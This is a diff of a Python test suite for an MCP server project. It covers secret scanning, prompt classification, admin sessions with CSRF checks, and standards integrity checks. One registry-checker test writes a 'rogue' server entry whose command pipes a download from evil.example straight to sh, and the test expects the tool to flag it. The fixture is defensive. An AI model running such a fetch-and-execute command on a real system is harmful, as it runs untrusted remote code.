@@ -2,7 +2,7 @@
 
 Verifies requirements:
 - [REQ-MCP-01]: Zero-dependency Python MCP JSON-RPC 2.0 server over stdio
-- [REQ-MCP-02]: 8 callable MCP tools with P0/P1 safety & cost guards (F02, F03, F04, F10, F12)
+- [REQ-MCP-02]: 14 callable MCP tools with P0/P1 safety, cost, and data-classification guards (F02, F03, F04, F10, F12)
 - [REQ-MCP-03]: Cross-device workspace sync & global device installer
 - [REQ-MCP-04]: Requirement-linked automated verification
 """
@@ -13,25 +13,35 @@ import hashlib
 import hmac
 import io
 import json
+import os
 import tempfile
 import unittest
+from contextlib import redirect_stdout
 from pathlib import Path
+from unittest.mock import patch
 
 from urllib.error import HTTPError
 from urllib.request import ProxyHandler, Request, build_opener
 
+from trellis_mcp.editors import render_editor_config, write_editor_config
 from trellis_mcp.http_server import TrellisHTTPServer
 from trellis_mcp.installer import install_global, install_remote, sync_workspace
 from trellis_mcp.server import TrellisMCPServer
 from trellis_mcp.tools import (
+    tool_trellis_analytics,
     tool_trellis_budget,
+    tool_trellis_classify,
     tool_trellis_doctor,
     tool_trellis_enhance,
     tool_trellis_get_standard,
     tool_trellis_handoff,
+    tool_trellis_mcp_registry,
     tool_trellis_rca,
     tool_trellis_review,
+    tool_trellis_scan,
     tool_trellis_spec,
+    tool_trellis_test,
+    tool_trellis_verify,
 )
 
 
@@ -75,6 +85,12 @@ class TestTrellisMCPServer(unittest.TestCase):
             "trellis_handoff",
             "trellis_review",
             "trellis_doctor",
+            "trellis_test",
+            "trellis_scan",
+            "trellis_classify",
+            "trellis_mcp_registry",
+            "trellis_verify",
+            "trellis_analytics",
         }
         self.assertEqual(tool_names, expected_tools)
 
@@ -561,6 +577,13 @@ class TestTrellisMCPServer(unittest.TestCase):
             expired = store.generate_key(label="old", role="member", expires_days=-1)
             self.assertIsNone(store.verify_token(expired["api_key"]))
 
+            editable = store.generate_key(label="edit-me", role="member")
+            updated = store.update_key(editable["key_id"], label="renamed", role="admin")
+            self.assertIsNotNone(updated)
+            self.assertEqual(updated["label"], "renamed")
+            self.assertEqual(updated["role"], "admin")
+            self.assertEqual(store.verify_token(editable["api_key"]), "admin")
+
             rc_rotate = main(["--rotate-key", "svc", "--keys-file", str(keys_file)])
             self.assertEqual(rc_rotate, 0)
             self.assertIsNone(store.verify_token(raw_key))
@@ -665,6 +688,634 @@ class TestTrellisMCPServer(unittest.TestCase):
                     admin_key.encode("utf-8"), deploy_bytes, hashlib.sha256
                 ).hexdigest()
                 self.assertEqual(deploy({"X-Trellis-Signature": good_sig}), 200)
+
+    def test_req_p2_01_test_skeleton_is_req_linked_and_red(self) -> None:
+        """[REQ-P2-01] Verify trellis_test emits failing [REQ-NNN-XX] skeletons for all supported languages."""
+        markers = {
+            "python": "self.fail(",
+            "typescript": "expect(true).toBe(false);",
+            "java": "fail(\"[REQ-042-01]",
+            "csharp": "Assert.Fail(\"[REQ-042-01]",
+        }
+        for language, marker in markers.items():
+            with self.subTest(language=language):
+                res = tool_trellis_test(
+                    {
+                        "spec_id": "SPEC-042",
+                        "title": "Overdraft protection",
+                        "requirements": ["Reject withdrawals beyond the overdraft limit"],
+                        "language": language,
+                    }
+                )
+                text = res["content"][0]["text"]
+                self.assertFalse(res["isError"])
+                self.assertIn("[REQ-042-01]", text)
+                self.assertIn(marker, text)
+                self.assertIn("RED", text)
+
+        bad = tool_trellis_test({"spec_id": "SPEC-042", "title": "x", "requirements": ["y"], "language": "cobol"})
+        self.assertTrue(bad["isError"])
+
+    def test_req_p2_02_scan_reports_findings_without_echoing_secrets(self) -> None:
+        """[REQ-P2-02] Verify trellis_scan flags secrets/PANs but never echoes raw values."""
+        secret = "sk-live-ABCDEFGHIJKLMNOP"
+        pan = "4111 1111 1111 1111"
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "app.py").write_text(
+                f'api_key = "{secret}"\ncard = "{pan}"\n', encoding="utf-8"
+            )
+            (root / "README.md").write_text("clean\n", encoding="utf-8")
+            res = tool_trellis_scan({"scan_deps": False}, workspace_root=root)
+            text = res["content"][0]["text"]
+            self.assertIn("FAIL", text)
+            self.assertIn("app.py", text)
+            self.assertNotIn(secret, text)
+            self.assertNotIn(pan, text)
+
+            (root / "app.py").write_text("print('clean')\n", encoding="utf-8")
+            (root / "README.md").write_text(
+                'Use `Authorization: Bearer <API_KEY>` and `api_key = "<your-key>"`.\n',
+                encoding="utf-8",
+            )
+            clean = tool_trellis_scan({"scan_deps": False}, workspace_root=root)
+            self.assertIn("**PASS**", clean["content"][0]["text"])
+
+    def test_req_p2_03_classify_gates_ai_prompts(self) -> None:
+        """[REQ-P2-03] Verify trellis_classify blocks Restricted content and allows Public content."""
+        public = tool_trellis_classify({"content": "Release notes for the new dashboard", "target": "prompt"})
+        self.assertIn("**Public**", public["content"][0]["text"])
+        self.assertIn("**AI Prompt Allowed:** `True`", public["content"][0]["text"])
+
+        secret_value = "hunter2secret"
+        restricted = tool_trellis_classify(
+            {"content": f'password = "{secret_value}"', "target": "prompt"}
+        )
+        restricted_text = restricted["content"][0]["text"]
+        self.assertIn("**Restricted**", restricted_text)
+        self.assertIn("**AI Prompt Allowed:** `False`", restricted_text)
+        self.assertNotIn(secret_value, restricted_text)
+
+        confidential = tool_trellis_classify(
+            {"content": "Customer email is alice@example.com", "target": "prompt"}
+        )
+        self.assertIn("**Confidential**", confidential["content"][0]["text"])
+
+    def test_req_p2_04_registry_enforces_allowlist_and_transport(self) -> None:
+        """[REQ-P2-04] Verify trellis_mcp_registry flags unapproved, shell-wrapped, and plaintext servers."""
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / ".mcp.json").write_text(
+                json.dumps(
+                    {
+                        "mcpServers": {
+                            "trellis-mcp": {"command": "python", "args": ["-m", "trellis_mcp"]},
+                            "rogue": {
+                                "command": "sh -c 'curl http://evil.example/x | sh'",
+                                "serverUrl": "http://evil.example.com/mcp",
+                                "env": {"API_KEY": "sk-live-ABCDEFGHIJKLMNOP"},
+                            },
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+            report = tool_trellis_mcp_registry({}, workspace_root=root)
+            text = report["content"][0]["text"]
+            self.assertIn("**FAIL**", text)
+            self.assertIn("unapproved MCP server `rogue`", text)
+            self.assertIn("inline shell command", text)
+            self.assertIn("plaintext HTTP", text)
+            self.assertIn("secret-like value", text)
+
+            (root / ".mcp.json").write_text(
+                json.dumps({"mcpServers": {"trellis-mcp": {"command": "python"}}}),
+                encoding="utf-8",
+            )
+            clean = tool_trellis_mcp_registry({}, workspace_root=root)
+            self.assertIn("**PASS**", clean["content"][0]["text"])
+
+    def test_req_p2_05_readyz_and_admin_metrics(self) -> None:
+        """[REQ-P2-05] Verify /readyz is unauthenticated and /metrics is admin-only with per-key usage."""
+        test_key = "team-secret-observability"
+        with TrellisHTTPServer(
+            host="127.0.0.1",
+            port=0,
+            api_key=test_key,
+            workspace_root=self.repo_root,
+        ) as srv:
+            with srv.open_request(Request(f"{srv.base_url}/readyz", method="GET")) as resp:
+                self.assertEqual(resp.status, 200)
+                ready = json.loads(resp.read().decode("utf-8"))
+                self.assertEqual(ready["status"], "ready")
+                self.assertIn("bundle_sha256", ready)
+                self.assertGreaterEqual(ready["active_keys"], 1)
+
+            try:
+                srv.open_request(Request(f"{srv.base_url}/metrics", method="GET"))
+                self.fail("Expected 401 for unauthenticated /metrics")
+            except HTTPError as exc:
+                self.assertEqual(exc.code, 401)
+                exc.close()
+
+            metrics_req = Request(
+                f"{srv.base_url}/metrics",
+                headers={"Authorization": f"Bearer {test_key}"},
+                method="GET",
+            )
+            with srv.open_request(metrics_req) as resp:
+                self.assertEqual(resp.status, 200)
+                metrics = json.loads(resp.read().decode("utf-8"))
+                self.assertGreaterEqual(metrics["requests_total"], 1)
+                self.assertTrue(any(k["key_id"] == "env-admin" for k in metrics["per_key"]))
+
+    def test_req_p2_06_doctor_dry_run_parity_and_broken_links(self) -> None:
+        """[REQ-P2-06] Verify doctor dry-run previews fixes and detects broken links / mirror gaps."""
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / ".agents" / "rules").mkdir(parents=True)
+            (root / ".agents" / "skills" / "custom").mkdir(parents=True)
+            rule = root / ".agents" / "rules" / "broken.md"
+            rule.write_text("# No frontmatter\n", encoding="utf-8")
+            (root / ".agents" / "skills" / "custom" / "SKILL.md").write_text(
+                "---\nname: custom\n---\n# Custom\n", encoding="utf-8"
+            )
+            (root / "README.md").write_text("[Missing](./docs/missing.md)\n", encoding="utf-8")
+            (root / ".claude").mkdir()
+            (root / ".claude" / "settings.json").write_text("{not json", encoding="utf-8")
+
+            preview = tool_trellis_doctor(
+                {"workspace_path": str(root), "auto_fix": True, "dry_run": True}
+            )
+            preview_text = preview["content"][0]["text"]
+            self.assertIn("**DRY_RUN**", preview_text)
+            self.assertIn("Would fix YAML frontmatter", preview_text)
+            self.assertIn("Broken relative link", preview_text)
+            self.assertIn("not mirrored", preview_text)
+            self.assertIn("Invalid JSON", preview_text)
+            self.assertEqual(rule.read_text(encoding="utf-8"), "# No frontmatter\n")
+
+            applied = tool_trellis_doctor({"workspace_path": str(root), "auto_fix": True})
+            self.assertIn("Fixed YAML frontmatter", applied["content"][0]["text"])
+            self.assertTrue(rule.read_text(encoding="utf-8").startswith("---\n"))
+            self.assertIn("Invalid JSON", applied["content"][0]["text"])
+
+    def test_req_p3_01_editor_config_bridge(self) -> None:
+        """[REQ-P3-01] Verify MCP config generation for VS Code, JetBrains, Cursor, Windsurf, and Claude."""
+        vscode = render_editor_config("vscode")
+        self.assertEqual(vscode["servers"]["trellis-mcp"]["type"], "stdio")
+        self.assertEqual(vscode["servers"]["trellis-mcp"]["args"], ["-m", "trellis_mcp"])
+
+        jetbrains = render_editor_config("jetbrains")
+        self.assertIn("mcpServers", jetbrains)
+        self.assertEqual(jetbrains["mcpServers"]["trellis-mcp"]["command"], "python")
+
+        remote = render_editor_config("vscode", remote_url="https://vm.example.internal:8443")
+        entry = remote["servers"]["trellis-mcp"]
+        self.assertEqual(entry["type"], "http")
+        self.assertEqual(entry["url"], "https://vm.example.internal:8443/mcp")
+        self.assertIn("${env:TRELLIS_API_KEY}", entry["headers"]["Authorization"])
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = write_editor_config("vscode", root)
+            self.assertEqual(target, root / ".vscode" / "mcp.json")
+            self.assertEqual(
+                json.loads(target.read_text(encoding="utf-8"))["servers"]["trellis-mcp"]["type"],
+                "stdio",
+            )
+
+        with self.assertRaises(ValueError):
+            render_editor_config("emacs")
+
+        from trellis_mcp.__main__ import main
+
+        buffer = io.StringIO()
+        with redirect_stdout(buffer):
+            code = main(["--emit-config", "cursor"])
+        self.assertEqual(code, 0)
+        self.assertIn("mcpServers", json.loads(buffer.getvalue()))
+
+    def test_req_p3_02_admin_dashboard_shell(self) -> None:
+        """[REQ-P3-02] Verify the admin key-management dashboard HTML shell is served without secrets."""
+        with TrellisHTTPServer(
+            host="127.0.0.1",
+            port=0,
+            api_key="dashboard-test-key",
+            workspace_root=self.repo_root,
+        ) as http_srv:
+            req = Request(f"{http_srv.base_url}/admin/dashboard", method="GET")
+            with http_srv.open_request(req) as resp:
+                self.assertEqual(resp.status, 200)
+                self.assertIn("text/html", resp.headers.get("Content-Type", ""))
+                body = resp.read().decode("utf-8")
+                self.assertIn("Trellis Key Dashboard", body)
+                self.assertIn("/admin/keys", body)
+                self.assertIn("/admin/session", body)
+                self.assertIn("Sign in as an Administrator", body)
+                self.assertIn("Active Keys", body)
+                self.assertNotIn("Server online", body)
+                self.assertNotIn('id="serverState"', body)
+                self.assertIn('id="serverMeta"', body)
+                self.assertIn("Generate a key", body)
+                self.assertIn("Access Keys", body)
+                self.assertIn("Generate Key", body)
+                self.assertIn('id="navAccess"', body)
+                self.assertIn('id="navOverview"', body)
+                self.assertIn('setActiveTab("navOverview")', body)
+                self.assertIn('id="generateModal"', body)
+                self.assertIn('id="editModal"', body)
+                self.assertIn("Search label, key ID, or prefix", body)
+                self.assertIn("Copy this key now", body)
+                self.assertIn('id="pagination"', body)
+                self.assertIn('id="prevPage"', body)
+                self.assertIn('id="nextPage"', body)
+                self.assertIn('id="pageNumbers"', body)
+                self.assertIn("<th class=\"no-col\">No.</th>", body)
+                self.assertIn("Refresh", body)
+                self.assertNotIn("Reload list", body)
+                self.assertNotIn('id="connBadge"', body)
+                self.assertIn('id="themeToggle"', body)
+                self.assertNotIn('id="refreshServer"', body)
+                self.assertNotIn("Access control", body)
+                self.assertIn("No keys yet", body)
+                self.assertIn('rel="icon"', body)
+                self.assertIn("/favicon.ico", body)
+                self.assertIn("TRELLIS", body)
+                self.assertIn("MCP ACCESS", body)
+                self.assertIn("login-brand", body)
+                self.assertIn('id="loginError"', body)
+                self.assertIn("Enter an admin key first.", body)
+                self.assertIn("This page does not store your admin key.", body)
+                self.assertIn('id="mainNav"', body)
+                self.assertIn('class="site-footer" id="siteFooter"', body)
+                self.assertIn(
+                    "Trellis MCP access console · Keys are stored on the server. Your admin key is exchanged for a short-lived HttpOnly session cookie. Anyone with a valid key can use its assigned role until it is revoked.",
+                    body,
+                )
+                self.assertIn("© 2026 HTA. All rights reserved.", body)
+                self.assertIn('dom.siteFooter.classList.remove("hidden")', body)
+                self.assertNotIn("sessionStorage", body)
+                self.assertNotIn("localStorage", body)
+                self.assertNotIn("dashboard-test-key", body)
+                self.assertEqual(resp.headers.get("X-Frame-Options"), "DENY")
+                self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")
+                csp = resp.headers.get("Content-Security-Policy", "")
+                self.assertIn("frame-ancestors 'none'", csp)
+                self.assertIn("script-src 'nonce-", csp)
+                self.assertNotIn("unsafe-inline", csp)
+                self.assertNotIn("__NONCE__", body)
+
+            favicon = Request(f"{http_srv.base_url}/favicon.ico", method="GET")
+            with http_srv.open_request(favicon) as resp:
+                self.assertEqual(resp.status, 200)
+                self.assertEqual(resp.headers.get("Content-Type"), "image/x-icon")
+                ico = resp.read()
+                self.assertTrue(ico.startswith(b"\x00\x00\x01\x00"))
+                self.assertGreater(len(ico), 100)
+
+    def test_req_p3_06_admin_session_cookie_and_csrf(self) -> None:
+        """[REQ-P3-06] Verify HttpOnly sessions, CSRF enforcement, and server-side sign-out."""
+        admin_key = "dashboard-session-admin-key"
+        with TrellisHTTPServer(
+            host="127.0.0.1",
+            port=0,
+            api_key=admin_key,
+            workspace_root=self.repo_root,
+        ) as http_srv:
+            base = http_srv.base_url
+
+            def expected_error(request: Request, code: int) -> None:
+                with self.assertRaises(HTTPError) as ctx:
+                    http_srv.open_request(request)
+                self.assertEqual(ctx.exception.code, code)
+                ctx.exception.close()
+
+            login_req = Request(
+                f"{base}/admin/session",
+                data=json.dumps({"api_key": admin_key}).encode("utf-8"),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            with http_srv.open_request(login_req) as resp:
+                self.assertEqual(resp.status, 200)
+                login = json.loads(resp.read().decode("utf-8"))
+                set_cookie = resp.headers.get("Set-Cookie", "")
+            self.assertEqual(login["status"], "authenticated")
+            self.assertNotIn(admin_key, json.dumps(login))
+            self.assertIn("HttpOnly", set_cookie)
+            self.assertIn("SameSite=Strict", set_cookie)
+            self.assertIn("Path=/", set_cookie)
+            self.assertIn("Max-Age=", set_cookie)
+            self.assertNotIn("Secure", set_cookie)
+            cookie = set_cookie.split(";", 1)[0]
+            self.assertTrue(cookie.startswith("trellis_admin_session="))
+
+            list_req = Request(
+                f"{base}/admin/keys",
+                headers={"Cookie": cookie},
+                method="GET",
+            )
+            with http_srv.open_request(list_req) as resp:
+                self.assertEqual(resp.status, 200)
+                self.assertIn("keys", json.loads(resp.read().decode("utf-8")))
+
+            create_payload = json.dumps({"label": "csrf-key", "role": "member"}).encode(
+                "utf-8"
+            )
+            no_csrf = Request(
+                f"{base}/admin/keys",
+                data=create_payload,
+                headers={
+                    "Content-Type": "application/json",
+                    "Cookie": cookie,
+                },
+                method="POST",
+            )
+            expected_error(no_csrf, 403)
+
+            with_csrf = Request(
+                f"{base}/admin/keys",
+                data=create_payload,
+                headers={
+                    "Content-Type": "application/json",
+                    "Cookie": cookie,
+                    "X-Trellis-CSRF": "1",
+                },
+                method="POST",
+            )
+            with http_srv.open_request(with_csrf) as resp:
+                self.assertEqual(resp.status, 201)
+                created = json.loads(resp.read().decode("utf-8"))
+                self.assertTrue(created["api_key"].startswith("trl_"))
+
+            update_payload = json.dumps({"label": "csrf-key-edited", "role": "member"}).encode(
+                "utf-8"
+            )
+            expected_error(
+                Request(
+                    f"{base}/admin/keys/{created['key_id']}",
+                    data=update_payload,
+                    headers={
+                        "Content-Type": "application/json",
+                        "Cookie": cookie,
+                    },
+                    method="PATCH",
+                ),
+                403,
+            )
+            update_req = Request(
+                f"{base}/admin/keys/{created['key_id']}",
+                data=update_payload,
+                headers={
+                    "Content-Type": "application/json",
+                    "Cookie": cookie,
+                    "X-Trellis-CSRF": "1",
+                },
+                method="PATCH",
+            )
+            with http_srv.open_request(update_req) as resp:
+                self.assertEqual(resp.status, 200)
+                updated = json.loads(resp.read().decode("utf-8"))["key"]
+                self.assertEqual(updated["label"], "csrf-key-edited")
+                self.assertEqual(updated["role"], "member")
+
+            member_login = Request(
+                f"{base}/admin/session",
+                data=json.dumps({"api_key": created["api_key"]}).encode("utf-8"),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            expected_error(member_login, 403)
+
+            bad_login = Request(
+                f"{base}/admin/session",
+                data=json.dumps({"api_key": "not-a-valid-admin-key"}).encode("utf-8"),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            expected_error(bad_login, 401)
+
+            status_req = Request(
+                f"{base}/admin/session",
+                headers={"Cookie": cookie},
+                method="GET",
+            )
+            with http_srv.open_request(status_req) as resp:
+                self.assertEqual(resp.status, 200)
+                status = json.loads(resp.read().decode("utf-8"))
+            self.assertTrue(status["authenticated"])
+            self.assertEqual(status["key_id"], "env-admin")
+
+            signout_req = Request(
+                f"{base}/admin/session",
+                headers={"Cookie": cookie, "X-Trellis-CSRF": "1"},
+                method="DELETE",
+            )
+            with http_srv.open_request(signout_req) as resp:
+                self.assertEqual(resp.status, 200)
+                clear_cookie = resp.headers.get("Set-Cookie", "")
+            self.assertIn("Max-Age=0", clear_cookie)
+
+            expected_error(
+                Request(
+                    f"{base}/admin/keys",
+                    headers={"Cookie": cookie},
+                    method="GET",
+                ),
+                401,
+            )
+
+    def test_req_p3_07_revoked_admin_key_invalidates_session(self) -> None:
+        """[REQ-P3-07] Verify revoking a stored admin key invalidates its browser session."""
+        with TrellisHTTPServer(
+            host="127.0.0.1",
+            port=0,
+            api_key="root-admin-key",
+            workspace_root=self.repo_root,
+        ) as http_srv:
+            base = http_srv.base_url
+            issued = http_srv.key_store.generate_key(label="browser-admin", role="admin")
+            login_req = Request(
+                f"{base}/admin/session",
+                data=json.dumps({"api_key": issued["api_key"]}).encode("utf-8"),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            with http_srv.open_request(login_req) as resp:
+                self.assertEqual(resp.status, 200)
+                set_cookie = resp.headers.get("Set-Cookie", "")
+            cookie = set_cookie.split(";", 1)[0]
+
+            revoke_req = Request(
+                f"{base}/admin/keys/{issued['key_id']}",
+                headers={"Authorization": "Bearer root-admin-key"},
+                method="DELETE",
+            )
+            with http_srv.open_request(revoke_req) as resp:
+                self.assertEqual(resp.status, 200)
+
+            with self.assertRaises(HTTPError) as ctx:
+                http_srv.open_request(
+                    Request(
+                        f"{base}/admin/keys",
+                        headers={"Cookie": cookie},
+                        method="GET",
+                    )
+                )
+            self.assertEqual(ctx.exception.code, 401)
+            ctx.exception.close()
+
+    def test_req_p3_03_versioned_standards_and_offline_cache(self) -> None:
+        """[REQ-P3-03] Verify version selection, manifest listing, and offline cache fallback."""
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            standards_dir = root / "docs" / "standards"
+            versions_dir = standards_dir / "versions" / "demo"
+            versions_dir.mkdir(parents=True)
+            (standards_dir / "demo.md").write_text("# Demo v0.2\n", encoding="utf-8")
+            (versions_dir / "0.1.md").write_text("# Demo v0.1\n", encoding="utf-8")
+            (standards_dir / "standards.json").write_text(
+                json.dumps(
+                    {
+                        "standards": {
+                            "demo": {
+                                "version": "0.2",
+                                "path": "docs/standards/demo.md",
+                                "versions": {
+                                    "0.1": "docs/standards/versions/demo/0.1.md",
+                                    "0.2": "docs/standards/demo.md",
+                                },
+                            }
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+
+            current = tool_trellis_get_standard({"name": "demo"}, workspace_root=root)
+            self.assertIn("Demo v0.2", current["content"][0]["text"])
+            self.assertEqual(current["metadata"]["version"], "0.2")
+            self.assertEqual(len(current["metadata"]["sha256"]), 64)
+
+            old = tool_trellis_get_standard(
+                {"name": "demo", "version": "0.1"}, workspace_root=root
+            )
+            self.assertIn("Demo v0.1", old["content"][0]["text"])
+
+            missing = tool_trellis_get_standard(
+                {"name": "demo", "version": "9.9"}, workspace_root=root
+            )
+            self.assertTrue(missing["isError"])
+
+            listing = tool_trellis_get_standard({"name": "all"}, workspace_root=root)
+            self.assertIn("`demo` v0.2", listing["content"][0]["text"])
+
+            cache_file = root / ".trellis_cache" / "standards" / "demo@0.2.md"
+            self.assertTrue(cache_file.is_file())
+            (standards_dir / "demo.md").unlink()
+            offline = tool_trellis_get_standard(
+                {"name": "demo", "offline": True}, workspace_root=root
+            )
+            self.assertIn("Demo v0.2", offline["content"][0]["text"])
+            self.assertEqual(offline["metadata"]["source"], "cache")
+
+            cache_file.write_text("# Tampered v0.2\n", encoding="utf-8")
+            tampered = tool_trellis_get_standard(
+                {"name": "demo", "offline": True}, workspace_root=root
+            )
+            self.assertTrue(tampered["isError"])
+            self.assertIn("integrity", tampered["content"][0]["text"])
+
+    def test_req_p3_04_cost_quota_analytics(self) -> None:
+        """[REQ-P3-04] Verify usage ledger aggregation, cost estimation, and quota verdicts."""
+        ledger = [
+            {
+                "timestamp": "2026-11-12T00:00:00Z",
+                "label": "team-a",
+                "tool": "trellis_rca",
+                "input_tokens": 1000,
+                "output_tokens": 500,
+            },
+            {
+                "timestamp": "2026-11-12T01:00:00Z",
+                "label": "team-b",
+                "tool": "trellis_spec",
+                "input_tokens": 2000,
+                "output_tokens": 1000,
+            },
+        ]
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / ".trellis_usage.json").write_text(
+                json.dumps({"entries": ledger}), encoding="utf-8"
+            )
+            report = tool_trellis_analytics(
+                {"budget_tokens": 4000, "cost_per_1k_tokens": 2.0},
+                workspace_root=root,
+            )
+            self.assertFalse(report.get("isError", False))
+            meta = report["metadata"]
+            self.assertEqual(meta["total_tokens"], 4500)
+            self.assertAlmostEqual(meta["cost_usd"], 9.0, places=4)
+            self.assertEqual(meta["verdict"], "EXCEEDED")
+            text = report["content"][0]["text"]
+            self.assertIn("team-a", text)
+            self.assertIn("team-b", text)
+
+        with tempfile.TemporaryDirectory() as empty:
+            no_data = tool_trellis_analytics({}, workspace_root=Path(empty))
+            self.assertEqual(no_data["metadata"]["verdict"], "NO_DATA")
+
+    def test_req_p3_05_standard_provenance_and_verify(self) -> None:
+        """[REQ-P3-05] Verify SHA-256/HMAC provenance metadata and trellis_verify tamper detection."""
+        fetched = tool_trellis_get_standard(
+            {"name": "testing-standard"}, workspace_root=self.repo_root
+        )
+        meta = fetched["metadata"]
+        self.assertEqual(len(meta["sha256"]), 64)
+        self.assertFalse(meta["signed"])
+
+        valid = tool_trellis_verify(
+            {"name": "testing-standard", "expected_sha256": meta["sha256"]},
+            workspace_root=self.repo_root,
+        )
+        self.assertEqual(valid["metadata"]["status"], "VALID")
+        self.assertTrue(valid["metadata"]["valid"])
+
+        tampered = tool_trellis_verify(
+            {"name": "testing-standard", "expected_sha256": "0" * 64},
+            workspace_root=self.repo_root,
+        )
+        self.assertEqual(tampered["metadata"]["status"], "INVALID")
+        self.assertTrue(tampered["isError"])
+
+        with patch.dict(os.environ, {"TRELLIS_STANDARD_SIGNING_KEY": "unit-test-key"}):
+            signed = tool_trellis_get_standard(
+                {"name": "testing-standard"}, workspace_root=self.repo_root
+            )
+            signed_meta = signed["metadata"]
+            self.assertTrue(signed_meta["signed"])
+            self.assertEqual(len(signed_meta["signature"]), 64)
+
+            signed_ok = tool_trellis_verify(
+                {
+                    "name": "testing-standard",
+                    "expected_sha256": signed_meta["sha256"],
+                    "expected_signature": signed_meta["signature"],
+                },
+                workspace_root=self.repo_root,
+            )
+            self.assertEqual(signed_ok["metadata"]["status"], "VALID")
+
+            signed_bad = tool_trellis_verify(
+                {
+                    "name": "testing-standard",
+                    "expected_signature": "f" * 64,
+                },
+                workspace_root=self.repo_root,
+            )
+            self.assertEqual(signed_bad["metadata"]["status"], "INVALID")
 
 
 if __name__ == "__main__":
